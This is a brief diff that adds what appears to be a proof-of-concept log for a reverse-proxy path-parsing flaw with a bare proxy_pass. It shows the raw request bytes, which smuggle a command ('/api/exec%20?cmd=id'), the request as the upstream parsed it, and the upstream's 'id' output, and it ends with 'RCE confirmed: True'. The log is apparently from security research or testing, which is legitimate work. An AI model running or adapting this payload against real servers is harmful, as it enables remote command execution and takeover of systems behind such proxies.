@@ -1,0 +1,17 @@
+build        : 6fb186ed
+config       : bare proxy_pass http://backend  (NO URI component, NO trailing slash)
+proxy port   : 52673   upstream port: 40943
+variable     : decoded space in the path is forwarded even with a bare proxy_pass.
+               The build re-encodes the space, but the token count is what splits the line.
+
+client request (bytes on the wire):
+b'GET /api/exec%20?cmd=id HTTP/1.1\r\nHost: alpha.test\r\nConnection: close\r\n\r\n'
+
+upstream request head (bytes the upstream actually parsed):
+b'GET /api/exec%20?cmd=id HTTP/1.1\r\nHost: 127.0.0.1:40943\r\nConnection: close\r\n\r\n'
+
+client response status: HTTP/1.1 200 OK
+client response body  : uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),101(lxd)
+
+
+RCE confirmed: True
